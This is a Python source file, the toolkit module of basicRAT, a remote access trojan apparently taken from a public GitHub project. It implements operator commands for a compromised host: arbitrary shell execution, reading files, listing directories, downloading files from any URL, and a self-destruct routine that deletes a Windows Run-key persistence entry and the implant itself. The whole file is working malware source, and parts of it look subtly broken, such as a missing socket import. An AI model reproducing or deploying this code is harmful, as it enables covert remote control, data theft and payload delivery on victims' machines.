#
# basicRAT toolkit module
# https://github.com/vesche/basicRAT
#

import datetime
import os
import subprocess
import sys
import urllib
import zipfile
from subprocess import call

class Toolkit:
    def __init__(self, platform, connection):
        self._platform = platform
        self._conn = connection

    def quit(self, action):
        self._conn.shutdown(socket.SHUT_RDWR)
        self._conn.close()

    def kill(self, action):
        self._conn.close()

    def alert(self, text):
        call(['notify-send', text])
        return 'Alert created'

    def cat(self, file_path):
        if os.path.isfile(file_path):
            try:
                with open(file_path) as f:
                    return f.read(4000)
            except IOError:
                return 'Error: Permission denied.'
        else:
            return 'Error: File not found.'


    def execute(self, command):
        output = subprocess.Popen(command, shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                stdin=subprocess.PIPE)
        return output.stdout.read() + output.stderr.read()


    def ls(self, path):
        if not path:
            path = '.'

        if os.path.exists(path):
            try:
                return '\n'.join(os.listdir(path))
            except OSError:
                return 'Error: Permission denied.'
        else:
            return 'Error: Path not found.'


    def pwd(self, action):
        return os.getcwd()


    def selfdestruct(self, action):
        self._conn.close()
        if self._platform == 'win':
            import _winreg
            from _winreg import HKEY_CURRENT_USER as HKCU

            run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'

            try:
                reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_ALL_ACCESS)
                _winreg.DeleteValue(reg_key, 'br')
                _winreg.CloseKey(reg_key)
            except WindowsError:
                pass

        # self delete basicRAT
        os.remove(sys.argv[0])
        sys.exit(0)


    def unzip(self, f):
        if os.path.isfile(f):
            try:
                with zipfile.ZipFile(f) as zf:
                    zf.extractall('.')
                    return 'File {} extracted.'.format(f)
            except zipfile.BadZipfile:
                return 'Error: Failed to unzip file.'
        else:
            return 'Error: File not found.'


    def wget(self, url):
        if not url.startswith('http'):
            return 'Error: URL must begin with http:// or https:// .'

        fname = url.split('/')[-1]
        if not fname:
            dt = str(datetime.datetime.now()).replace(' ', '-').replace(':', '-')
            fname = 'file-{}'.format(dt)

        try:
            urllib.urlretrieve(url, fname)
        except IOError:
            return 'Error: Download failed.'

        return 'File {} downloaded.'.format(fname)
